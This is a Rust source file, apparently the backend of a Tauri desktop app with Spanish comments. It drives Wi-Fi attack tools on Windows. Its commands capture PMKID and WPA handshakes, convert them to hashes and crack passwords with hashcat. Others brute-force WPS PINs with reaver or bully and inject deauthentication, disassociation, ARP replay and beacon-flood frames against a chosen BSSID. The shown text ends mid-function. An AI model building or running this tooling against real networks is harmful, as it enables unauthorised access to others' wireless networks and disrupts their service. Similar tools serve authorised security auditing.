use serde::Serialize;
use tauri::{command, AppHandle};
use tauri_plugin_shell::process::Output;
use tauri_plugin_shell::ShellExt;

// ═══════════════════════════════════════════════════════════════════════════════
// PATHS
// ═══════════════════════════════════════════════════════════════════════════════
fn tool_path(var: &str, fallback: &str) -> std::path::PathBuf {
    std::env::var(var).unwrap_or_else(|_| fallback.to_string()).into()
}

// ═══════════════════════════════════════════════════════════════════════════════
// MODELOS
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize)]
pub struct WifiNetwork {
    pub ssid:     String,
    pub bssid:    Option<String>,
    pub signal:   Option<u8>,
    pub channel:  Option<u8>,
    pub security: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ScanResult {
    pub networks: Vec<WifiNetwork>,
    pub error:    Option<String>,
}
impl ScanResult {
    fn ok(nets: Vec<WifiNetwork>) -> Self { Self { networks: nets, error: None } }
    fn err(msg: &str) -> Self { Self { networks: vec![], error: Some(msg.into()) } }
}

#[derive(Debug, Clone, Serialize)]
pub struct CmdResponse {
    pub success:    bool,
    pub output:     String,
    pub stderr:     String,
    pub exit_code:  Option<i32>,
}

macro_rules! re {
    ($re:expr) => { once_cell::sync::Lazy::new(|| regex::Regex::new($re).unwrap()) };
}
static RE_SSID:   once_cell::sync::Lazy<regex::Regex> = re!(r"^SSID\s+\d+\s*:\s*(.*)");
static RE_NEW_ID: once_cell::sync::Lazy<regex::Regex> = re!(r"^SSID\s+\d+\s*:");
static RE_BSSID:  once_cell::sync::Lazy<regex::Regex> = re!(r"^BSSID\s+\d*\s*:\s*([0-9A-Fa-f:]{17})");
static RE_SIG:    once_cell::sync::Lazy<regex::Regex> = re!(r"(?:Signal|Señal)\s*:\s*(\d+)%");
static RE_CHAN:   once_cell::sync::Lazy<regex::Regex> = re!(r"(?:Channel|Canal)\s*:\s*(\d+)");
static RE_SEC:    once_cell::sync::Lazy<regex::Regex> =
    re!(r"(?:Authentication|Seguridad|Autenticaci[oó]n|Tipo de autenticaci[oó]n)\s*:\s*(.*)");

// ═══════════════════════════════════════════════════════════════════════════════
// PARSEADOR NETSH
// ═══════════════════════════════════════════════════════════════════════════════

fn parse_netsh(raw: &str) -> Vec<WifiNetwork> {
    let mut nets = vec![];
    let mut lines = raw.lines().peekable();

    while let Some(line) = lines.next() {
        let caps = match RE_SSID.captures(line.trim()) {
            Some(c) => c, None => continue,
        };
        let mut ssid     = caps[1].trim().to_string();
        let mut bssid    = None;
        let mut signal   = None;
        let mut channel  = None;
        let mut security = String::from("Abierta");

        'block: while let Some(sub) = lines.peek() {
            let s = sub.trim();
            if RE_NEW_ID.is_match(s) { break 'block; }
            lines.next();
            if let Some(c) = RE_BSSID.captures(s) { bssid = Some(c[1].to_uppercase()); }
            else if let Some(c) = RE_SIG.captures(s) { if let Ok(n) = c[1].parse() { signal = Some(n); } }
            else if let Some(c) = RE_CHAN.captures(s) { if let Ok(n) = c[1].parse() { channel = Some(n); } }
            else if let Some(c) = RE_SEC.captures(s) {
                let sec = c[1].trim();
                if !sec.is_empty() { security = sec.to_string(); }
            }
        }
        if ssid.is_empty() && bssid.is_some() { ssid = "Red oculta".into(); }
        nets.push(WifiNetwork { ssid, bssid, signal, channel, security });
    }
    nets
}

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

async fn run_bin(app: &AppHandle, exe: &str, args: &[String]) -> CmdResponse {
    if let Err(hint) = require_bin(exe) {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: hint, exit_code: None,
        };
    }
    let shell = app.shell();
    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
    match shell.command(exe).args(&arg_refs).output().await {
        Ok(data) => CmdResponse {
            success:   data.status.success(),
            output:    String::from_utf8_lossy(&data.stdout).into_owned(),
            stderr:    String::from_utf8_lossy(&data.stderr).into_owned(),
            exit_code: data.status.code(),
        },
        Err(e) => CmdResponse {
            success: false, output: String::new(),
            stderr: e.to_string(), exit_code: None,
        },
    }
}

/// Preflight: el binario debe existir (ruta directa o PATH) antes de lanzarlo.
/// Devuelve Ok(()) o un mensaje accionable con el hint de instalación.
fn require_bin(exe: &str) -> Result<(), String> {
    if std::path::Path::new(exe).exists() {
        return Ok(());
    }
    // Nombre base para which (tolera rutas con directorios inexistentes).
    let base = exe.rsplit(['/', '\\']).next().unwrap_or(exe);
    if which::which(base).is_ok() || which::which(exe).is_ok() {
        return Ok(());
    }
    Err(format!(
        "❌ Binario no encontrado: {}\n\n{}\n\n(Verifica con detect_tools / define la variable *_PATH)",
        exe,
        crate::tools_detect::install_hint_for(exe)
    ))
}

/// Conversión post-captura: hcxpcapngtool si existe; si no, el parser Rust nativo
/// (caso normal en Windows, donde hcxtools no es portable).
async fn convert_capture(app: &AppHandle, pcap: &str, hccapx: &str) -> CmdResponse {
    let prog2 = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
    let exe2 = prog2.to_str().unwrap_or("hcxpcapngtool.exe").to_string();
    if require_bin(&exe2).is_ok() {
        let c_args = vec!["-k".into(), "-o".into(), hccapx.to_string(), pcap.to_string()];
        let r = run_bin(app, &exe2, &c_args).await;
        let body = format!("Paso 2 — Extracción EAPOL (hcxpcapngtool):\n{}\nArchivo: {}", r.output, hccapx);
        return CmdResponse { success: r.success, output: body, stderr: r.stderr, exit_code: r.exit_code };
    }
    let out22000 = format!("{}.22000", pcap.trim_end_matches(".pcapng").trim_end_matches(".pcap"));
    let conv = crate::pcap_convert::convert_pcap_to_22000(pcap.to_string(), out22000.clone()).await;
    let body = format!(
        "Paso 2 — Extracción EAPOL NATIVA (hcxpcapngtool ausente):\n{}\nArchivo: {}",
        conv.messages.join("\n"), out22000
    );
    let ok = conv.success && conv.hash_count > 0;
    CmdResponse {
        success: ok, output: body.clone(),
        stderr: if ok { String::new() } else { body }, exit_code: Some(if ok { 0 } else { 1 }),
    }
}
/// Interfaz de inyección/captura: si el usuario no indicó ninguna, se usa el
/// valor estilo-Linux con un aviso accionable (en Windows hace falta el GUID
/// NPF_{…} que muestra el modal «Activar modo monitor»).
fn resolve_iface(iface: Option<String>, default: &str) -> (String, Option<String>) {
    match iface {
        Some(s) if !s.trim().is_empty() => (s, None),
        _ => (default.into(), Some(format!(
            "⚠️ Sin interfaz indicada: usando '{}'. En Windows indica el GUID NPF_{{…}} (modal «Activar modo monitor»).",
            default))),
    }
}

/// Antepone el aviso de interfaz (si lo hay) al cuerpo de la respuesta.
fn with_iface_warn(mut body: String, warn: &Option<String>) -> String {
    if let Some(w) = warn {
        body = format!("{}\n\n{}", w, body);
    }
    body
}
fn wrap(title: &str, body: &str, ok: bool) -> String {
    let icon = if ok { "\u{2705}" } else { "\u{274C}" };
    format!("{} {}\n{}", icon, title, body)
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 1 — ESCANEAR
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn scan_wifi(app: AppHandle) -> ScanResult {
    use std::time::Duration;
    let shell = app.shell();
    let out: Output = match tokio::time::timeout(Duration::from_secs(10),
        shell.command("powershell")
            .args(["-NoProfile", "-Command", "netsh wlan show networks mode=bssid"])
            .output()
    ).await {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => return ScanResult::err(&e.to_string()),
        Err(_) => return ScanResult::err("Timeout: netsh wlan tardó más de 10s."),
    };
    ScanResult::ok(parse_netsh(&String::from_utf8_lossy(&out.stdout)))
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 2 — CAPTURAR PMKID  (hcxdumptool)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn pmkid_capture(app: AppHandle, bssid: String, channel: Option<u8>, duration_seconds: Option<u64>) -> CmdResponse {
    let prog  = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let ch    = channel.unwrap_or(1);
    let dur   = duration_seconds.unwrap_or(120);
    let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(),
        "-t".into(), dur.to_string(),
        "-w".into(), outfile.clone(),
        "--bssid".into(), bssid.clone(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    let r = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let body = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture · {} · Canal={} · {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 3 — CONVERTIR PMKID -> HASH  (hcxpcapngtool)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn pmkid_convert(_app: AppHandle, pcapng_path: String, output_dir: Option<String>) -> CmdResponse {
    let prog    = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
    let out_dir = output_dir.as_deref().unwrap_or(".");
    let stem    = std::path::Path::new(&pcapng_path).file_stem().and_then(|s| s.to_str()).unwrap_or("out");
    let hash_file = format!("{}/{}.22000", out_dir, stem);
    let exe = prog.to_str().unwrap_or("hcxpcapngtool.exe");
    // Sin binario externo (caso normal en Windows): conversor Rust nativo.
    if require_bin(exe).is_err() {
        let conv = crate::pcap_convert::convert_pcap_to_22000(pcapng_path.clone(), hash_file.clone()).await;
        let body = format!(
            "Conversor NATIVO (hcxpcapngtool ausente, ver detect_tools).\nInput: {}\nOutput: {}\n{}",
            pcapng_path, hash_file, conv.messages.join("\n")
        );
        return CmdResponse {
            success: conv.success && conv.hash_count > 0,
            output: wrap(&format!("PMKID Convert (nativo) · {pcapng_path}"), &body, conv.success),
            stderr: if conv.success { String::new() } else { body.clone() },
            exit_code: Some(if conv.success { 0 } else { 1 }),
        };
    }
    let args = vec!["-o".into(), hash_file.clone(), pcapng_path.clone()];
    let r    = run_bin(&_app, prog.to_str().unwrap_or("hcxpcapngtool.exe"), &args).await;
    let body = format!("Input: {}\nOutput: {}\n\n{}", pcapng_path, hash_file, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("PMKID Convert · {pcapng_path}"), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 4 — CRACK PMKID  (hashcat)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn pmkid_crack(app: AppHandle, hash_file: String, wordlist: Option<String>, attack_mode: Option<u8>) -> CmdResponse {
    let prog     = tool_path("HASHCAT_PATH", "hashcat.exe");
    let wordlist_bin = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
    let mode     = attack_mode.unwrap_or(0);
    let cracked_out = format!("{}.cracked", hash_file);
    let args = vec![
        "-m".into(), "22000".into(),
        "-a".into(), mode.to_string(),
        "-o".into(), cracked_out.clone(),
        "--force".into(),
        hash_file.clone(),
        wordlist_bin.clone(),
    ];
    let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;
    let pw_opt   = r.output.lines().find(|l| l.contains(':')).map(|s| s.to_string());
    let body = if let Some(ref p) = pw_opt {
        format!("\u{1F512} PASSWORD: {}\n\n{}", p, r.output)
    } else {
        format!("Sin resultado aun. Hash: {}\nModo: {}  Wordlist: {}\n\n{}", hash_file, mode, wordlist_bin, r.output)
    };
    CmdResponse { success: pw_opt.is_some() || r.success, output: wrap(&format!("PMKID Crack \u{00B7} {hash_file}"), &body, pw_opt.is_some()), stderr: r.stderr, exit_code: r.exit_code }
}

// ── Helpers WPS (Opción C: reaver por defecto, bully opcional) ────────────────
fn reaver_bin() -> std::path::PathBuf { tool_path("REAVER_PATH", "reaver.exe") }
fn reaver_cmd() -> String {
    reaver_bin().to_str().unwrap_or("reaver.exe").to_string()
}
fn bully_bin() -> std::path::PathBuf { tool_path("BULLY_PATH", "bully.exe") }
fn has_bully() -> bool {
    // 1) BULLY_PATH explícita 2) tools/bully.exe 3) PATH
    if bully_bin().exists() { return true; }
    which_has("bully.exe") || which_has("bully")
}
fn which_has(name: &str) -> bool { which::which(name).is_ok() }

/// Aviso de interfaz best-effort: antepone el aviso (si lo hay) al texto.
fn with_opt_warn(mut body: String, warn: &Option<String>) -> String {
    if let Some(w) = warn {
        body = format!("{}\n\n{}", w, body);
    }
    body
}

/// Intento best-effort de fijar canal Npcap antes de WPS (reaver Win no salta
/// de canal solo: ver iface.c; el canal se fija aquí + flag -c de reaver).
/// No falla el ataque si no hay GUID NPF válido; solo anota el aviso.
/// Si el driver ignora el OID de canal, reintenta por frecuencia (kHz).
/// Si la interfaz es el valor por defecto estilo-Linux, avisa que en Windows
/// hace falta el GUID NPF_{…} del modal «Activar modo monitor».
async fn pin_channel_best_effort(iface: &str, channel: Option<u8>) -> Option<String> {
    let t = iface.trim();
    if t.is_empty() || t == "wlan0" || t == "wlan0mon" {
        return Some("⚠️ Sin interfaz NPF indicada (se usará '-i wlan0', inválido en Windows). Elige el adaptador en el modal «Activar modo monitor» y pega su GUID en el campo Interface.".into());
    }
    let ch = channel?;
    if !(1..=165).contains(&ch) { return Some(format!("Canal inválido {} (1-165), se omite.", ch)); }
    // Solo tiene sentido para GUIDs NPF_…; en otro caso reaver usa -c igualmente.
    if !iface.starts_with("NPF_") && !iface.contains("Device\\NPF_") { return None; }
    let r = crate::monitor_mode::set_monitor_channel(iface.to_string(), ch).await;
    if r.success { return None; }
    if let Some(khz) = crate::monitor_mode::channel_to_khz(ch) {
        let f = crate::monitor_mode::set_monitor_freq(iface.to_string(), khz).await;
        return Some(format!("Aviso canal: {} | Freq {} kHz: {}",
            r.message.lines().next().unwrap_or(""), khz,
            f.message.lines().next().unwrap_or("")));
    }
    Some(format!("Aviso canal: {}", r.message))
}

fn parse_wps_pin(out: &str) -> Option<String> {
    for line in out.lines() {
        let l = line.trim();
        let ll = l.to_lowercase();
        if ll.contains("wps pin") && (ll.contains(':') || ll.contains('=')) {
            // p.ej. "WPS PIN: '12345678'" / "[+] WPS PIN: 12345678"
            if let Some(pin) = l.split([':', '=']).last() {
                let pin = pin.trim().trim_matches(['\'', '"', ' ', '*']).to_string();
                if !pin.is_empty() { return Some(pin); }
            }
        }
    }
    None
}

fn parse_wpa_psk(out: &str) -> Option<String> {
    for line in out.lines() {
        let ll = line.to_lowercase();
        if (ll.contains("wpa psk") || ll.contains("wpa key") || ll.contains("psk:")) && line.contains(':') {
            if let Some(k) = line.split(':').last() {
                let k = k.trim().trim_matches(['\'', '"', ' ']).to_string();
                if !k.is_empty() && !k.to_lowercase().contains("unknown") { return Some(k); }
            }
        }
    }
    None
}
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String) -> CmdResponse {
    // Opción C: dispatcher — bully solo si existe, si no reaver (mismo objetivo).
    if has_bully() {
        let prog = bully_bin();
        let args = vec!["-b".into(), bssid.clone(), interface.clone()];
        let r = run_bin(&app, prog.to_str().unwrap_or("bully.exe"), &args).await;
        let pin = parse_wps_pin(&r.output);
        let psk = parse_wpa_psk(&r.output);
        let summary = match (&pin, &psk) {
            (Some(p), Some(k)) => format!("✅ PIN encontrado: {}\n✅ WPA PSK: {}", p, k),
            (Some(p), None) => format!("✅ PIN encontrado: {}\n{}", p, r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect::<Vec<_>>().join("\n")),
            _ => format!("bully ejecutado (BSSID {}). Revisa la salida para el progreso del PIN.\n\n{}", bssid, r.output.lines().take(40).collect::<Vec<_>>().join("\n")),
        };
        let ok = pin.is_some();
        return CmdResponse {
            success: ok || r.success,
            output: wrap(&format!("WPS Bruteforce (bully) · {} · {interface}", bssid), &summary, ok),
            stderr: r.stderr,
            exit_code: r.exit_code,
        };
    }
    // Fallback reaver.exe nativo Windows
    let prog = reaver_cmd();
    let pin_warn = pin_channel_best_effort(&interface, None).await;
    let inj = crate::capture::check_injection_capability(interface.clone()).await;
    let inj_warn = if inj.supported { None } else {
        Some(format!("⚠️ Inyección no disponible en esta interfaz.\n{}\nSugerencia: usa 'wsl (Kali-WSL2)' en la UI.", inj.message))
    };
    let args = vec!["-i".into(), interface.clone(), "-b".into(), bssid.clone(), "-vv".into(), "-L".into()];
    let r = run_bin(&app, &prog, &args).await;
    let pin = parse_wps_pin(&r.output);
    let psk = parse_wpa_psk(&r.output);
    let mut summary = match (&pin, &psk) {
        (Some(p), Some(k)) => format!("✅ WPS PIN: {}\n✅ WPA PSK: {}", p, k),
        (Some(p), None) => format!("✅ WPS PIN: {}", p),
        _ => format!("reaver ejecutado (bully.exe no encontrado → fallback automático).\nRevisa la salida para el progreso del PIN.\n\n{}", r.output.lines().take(40).collect::<Vec<_>>().join("\n")),
    };
    if let Some(w) = pin_warn { summary = format!("{}\n{}", w, summary); }
    if let Some(w) = inj_warn { summary = format!("{}\n{}", w, summary); }
    let ok = pin.is_some();
    CmdResponse {
        success: ok || r.success,
        output: wrap(&format!("WPS Bruteforce (reaver fallback) · {} · {interface}", bssid), &summary, ok),
        stderr: if has_bully() { r.stderr } else { format!("bully.exe no encontrado (opcional). Usado reaver.exe.\n{}", r.stderr) },
        exit_code: r.exit_code,
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 6 — SCAN AIRODUMP  (airodump-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
    let ch   = channel_filter.unwrap_or(0);
    let dur  = duration_secs.unwrap_or(60);
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let mut args = vec![
        "--write-interval".into(), "1000".into(),
        "--output-format".into(), "csv".into(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
    args.push(iface_in.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
    let body = format!("Binario: {}\nCanal: {}  Duracion: {}s\nInterface: {}\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap("AIRODUMP Scan", &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 7 — ESTADO DE INTERFAZ WiFi
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wifi_interface_status(_app: AppHandle) -> CmdResponse {
    let shell = _app.shell();
    let ps = "Get-NetAdapter | Where-Object {$_.MediaType -eq 'Native 802.11'} | Format-Table -AutoSize";
    let out = match shell.command("powershell").args(["-NoProfile", "-Command", ps]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 8 — LISTAR PROCESOS DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn list_attack_processes(_app: AppHandle) -> CmdResponse {
    let shell = _app.shell();
    let ps = "Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.ProcessName -match 'hcxdumptool|hashcat|bully|reaver|wash|pixiewps'} | Format-Table Id, ProcessName, Path -AutoSize";
    let out = match shell.command("powershell").args(["-NoProfile", "-Command", ps]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: true, output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::new(), exit_code: out.status.code() }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 9 — MATAR PROCESO DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn kill_attack_process(_app: AppHandle, pid: u32) -> CmdResponse {
    let shell = _app.shell();
    let cmd   = format!("taskkill /PID {} /F /T", pid);
    let out   = match shell.command("powershell").args(["-NoProfile", "-Command", &cmd]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 10 — CAPTURAR HANDSHAKE WPA/WPA2 (EAPOL 4-way)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn capture_handshake(app: AppHandle, bssid: String, essid: Option<String>, channel: Option<u8>, duration_seconds: Option<u64>) -> CmdResponse {
    let dur  = duration_seconds.unwrap_or(60);
    let ch   = channel.unwrap_or(1);
    let bssid_clean = bssid.replace(':', "");
    let pcap  = format!("handshake_{}.pcapng", bssid_clean);
    let hccapx = format!("handshake_{}.hccapx", bssid_clean);
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(), "-t".into(), dur.to_string(),
        "-w".into(), pcap.clone(),
        "--bssid".into(), bssid.clone(),
        "--channel".into(), ch.to_string(),
    ];
    if let Some(ref e) = essid { args.push("--essid".into()); args.push(e.clone()); }
    let prog  = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let cap  = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let conv = if cap.success {
        convert_capture(&app, &pcap, &hccapx).await
    } else { CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code } };
    let body = format!("Paso 1 — Captura:\n{}\n\n{}\n", cap.output, conv.output);
    let ok = conv.success;
    CmdResponse { success: ok, output: wrap(&format!("Handshake Capture · {} · Canal={} · {}s", bssid, ch, dur), &body, ok), stderr: format!("{}\n{}", cap.stderr, conv.stderr), exit_code: conv.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 11 — CRACK HANDSHAKE WPA/WPA2 (hashcat modo 22000)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn crack_handshake(app: AppHandle, hash_file: String, wordlist: Option<String>, attack_mode: Option<u8>, session_name: Option<String>) -> CmdResponse {
    let prog          = tool_path("HASHCAT_PATH", "hashcat.exe");
    let wordlist_bin  = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
    let mode_str      = "22000";
    let atk           = attack_mode.unwrap_or(0);
    let cracked_out   = format!("{}.cracked", hash_file);
    let args: Vec<String> = vec![
        "-m".into(), mode_str.into(), "-a".into(), atk.to_string(),
        "-o".into(), cracked_out.clone(), "--force".into(),
        "--status".into(), "--status-timer=10".into(),
        "--session".into(), session_name.clone().unwrap_or_else(|| "uifipill".into()),
        hash_file.clone(), wordlist_bin.clone(),
    ];
    let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;
    let pw_opt = r.output.lines().find(|l| l.contains(':') && !l.starts_with('#')).map(|s| s.to_string());
    let body   = if let Some(ref p) = pw_opt {
        format!("\u{1F512} PASSWORD CRACKEADA:\n{}\n\n{}", p, r.output)
    } else {
        format!("Sin resultado aun.\nHash: {}\nModo: {}  Ataque: {}  Wordlist: {}\n\n{}", hash_file, mode_str, atk, wordlist_bin, r.output)
    };
    let ok = pw_opt.is_some();
    CmdResponse { success: ok, output: wrap(&format!("Handshake Crack \u{00B7} {hash_file} \u{00B7} -a{atk}"), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 12 — DEAUTH INJECTION  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn deauth_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let cnt  = count.unwrap_or(10);
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let mut args = vec!["--deauth".into(), cnt.to_string(), "-a".into(), bssid.clone()];
    if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
    args.push(iface_in.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Deauth · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 13 — DISASSOC INJECTION  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn disassoc_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let cnt  = count.unwrap_or(5);
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let mut args = vec!["--disassociate".into(), cnt.to_string(), "-a".into(), bssid.clone()];
    if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
    args.push(iface_in.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Disassoc · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 14 — ARP REPLAY INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn arp_replay_inject(app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let addr     = address.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
    let args = vec!["--arpreply".into(), "-b".into(), target_bssid.clone(), "-h".into(), addr.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC fake: {}\nInterface: {}\n\n{}", prog.display(), target_bssid, addr, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("ARP Replay · {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 15 — BEACON FLOOD  (mdk3 Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn beacon_flood(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>, iface: Option<String>) -> CmdResponse {
    let prog  = tool_path("MDK3_PATH", "mdk3.exe");
    let bssid = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let ch    = channel.unwrap_or(1).to_string();
    let cnt   = beacon_count.unwrap_or(50);
    let (iface_in, iface_warn) = resolve_iface(iface, "wlan0mon");
    let mut args = vec![iface_in.clone(), "b".into(), "-c".into(), ch.clone(), "-n".into(), essid.clone(), "-s".into(), cnt.to_string()];
    args.push("-a".into()); args.push(bssid.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("mdk3.exe"), &args).await;
    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nBeacons: {}\nInterface: {}\n\n{}", prog.display(), essid, bssid, ch, cnt, iface_in, r.output);
    let body = with_iface_warn(body, &iface_warn);
    CmdResponse { success: r.success, output: wrap(&format!("Beacon Flood · {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 16 — WPS PBC  (reaver.exe -S, binario nativo Windows)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wps_pbc_attack(app: AppHandle, bssid: String, iface: Option<String>, channel: Option<u8>) -> CmdResponse {
    let prog = reaver_bin();
    let prog_s = reaver_cmd();
    let iface_in  = iface.unwrap_or_else(|| "wlan0".into());
    let ch_warn = pin_channel_best_effort(&iface_in, channel).await;
    let mut args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-S".into(), "-vv".into(), "-L".into()];
    if let Some(ch) = channel { args.push("-c".into()); args.push(ch.to_string()); }
    let r = run_bin(&app, &prog_s, &args).await;
    let pin = parse_wps_pin(&r.output);
    let psk = parse_wpa_psk(&r.output);
    let mut body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nCanal: {}\nModo: WPS PBC (-S)\n\n{}", prog.display(), bssid, iface_in, channel.map(|c| c.to_string()).unwrap_or("auto".into()), r.output);
    if let Some(w) = ch_warn { body = format!("{}\n\n{}", w, body); }
    let ok = pin.is_some();
    let mut summary = match (&pin, &psk) {
